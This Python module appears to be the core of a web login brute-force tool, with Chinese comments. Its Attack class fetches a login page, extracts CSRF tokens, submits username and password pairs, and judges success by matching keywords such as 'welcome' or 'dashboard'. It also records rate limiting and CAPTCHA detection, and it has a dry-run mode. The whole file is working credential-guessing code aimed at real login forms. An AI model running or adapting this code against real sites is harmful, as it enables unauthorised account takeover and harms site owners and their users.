#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import logging
import time
from typing import Optional

from .config.models import Config
from .utils.exceptions import RateLimitError
from .utils.parsers import contains_captcha, extract_token
from .services.http_client import HttpClient
from .services.reporting import StatsManager


class Attack:
    """
    负责执行单次登录尝试的具体逻辑。
    """

    def __init__(self, config: Config, stats: StatsManager, http_client: HttpClient):
        self.config = config
        self.stats = stats
        self.http = http_client

    def try_login(self, username: str, password: str) -> bool:
        """
        尝试一次登录。
        在 dry_run 模式下，将跳过实际的网络请求。
        """
        if self.config.dry_run:
            logging.info(f"[DRY RUN] 模拟登录: 用户名='{username}', 密码='***'")
            self.stats.update_attempt(username, password="***")  # nosec B106
            time.sleep(0.05)
            return False

        self.stats.update_attempt(username, password)

        try:
            resp = self._get_login_page()
            if not resp or not resp.text:
                self.stats.update("other_errors")
                return False

            token = self._extract_token(resp)
            data = self._build_login_data(username, password, token)
            resp2 = self.http.post(self.config.action, data=data)
            return self._handle_login_response(resp2)
        except RateLimitError as e:
            logging.warning(f"频率限制错误: {e}")
            self.stats.update("rate_limited")
            return False
        except Exception as e:
            logging.error(f"未知错误导致登录尝试失败 for {username}: {e}")
            self.stats.update("other_errors")
            return False

    def _get_login_page(self):
        resp = self.http.get(self.config.url)
        return resp

    def _extract_token(self, resp) -> Optional[str]:
        if not self.config.csrf:
            return None

        token = extract_token(
            resp.text, resp.headers.get("Content-Type", ""), self.config.csrf
        )
        if not token:
            logging.warning("未能提取CSRF Token（如目标无CSRF token可忽略）")
        return token

    def _build_login_data(
        self, username: str, password: str, token: Optional[str] = None
    ) -> dict:
        data = {"username": username, "password": password}
        if token and self.config.csrf:
            data[self.config.csrf] = token
        if self.config.login_field and self.config.login_value:
            data[self.config.login_field] = self.config.login_value
        return data

    def _handle_login_response(self, resp) -> bool:
        success_keywords = ["welcome", "dashboard", "logout", "profile", "成功"]
        failure_keywords = ["invalid", "incorrect", "failed", "error", "失败"]

        response_lower = resp.text.lower()

        success_count = sum(k in response_lower for k in success_keywords)
        failure_count = sum(k in response_lower for k in failure_keywords)

        if success_count > failure_count:
            self.stats.update_success(resp.request.body)
            return True

        if resp.status_code == 429:
            self.stats.update("rate_limited")

        if contains_captcha(response_lower):
            self.stats.update("captcha_detected")

        return False 